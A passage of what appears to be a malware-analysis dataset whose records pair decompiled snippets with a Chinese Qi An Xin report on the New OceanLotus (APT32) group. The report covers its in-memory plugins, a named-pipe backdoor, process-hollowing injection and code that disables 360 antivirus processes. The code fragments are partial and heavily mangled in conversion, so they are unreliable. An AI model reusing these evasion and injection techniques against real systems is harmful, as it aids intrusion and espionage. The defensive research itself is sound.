\n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "v30(v54);", "hash_code": "1ab0b01d3dcbec03dcbfc6c82a83078b68d65774f0207aa277a8d1c01c11cb6c", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "*((unsigned int(__fastcall*)(int64, int*, _int64, __QWORD, __DWORD, _int64*))(a1 + 16))(v27, v28, 28i64, 0i64, 0, &v26);", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "*((unsignedint(__fastcall*)(int64,int*,_int64,__QWORD,__DWORD,_int64*))(a1+16))(v27,v28,28i64,0i64,0,&v26);", "hash_code": "70dac8480253410570adffe21dc326585857af9d72d27216531ea01a824e7070", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "do { *v13++ ^= 0xF2u; --v14; } while (v14);\nif ((unsigned int)sub_20F1246(v20, a6, v12))", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  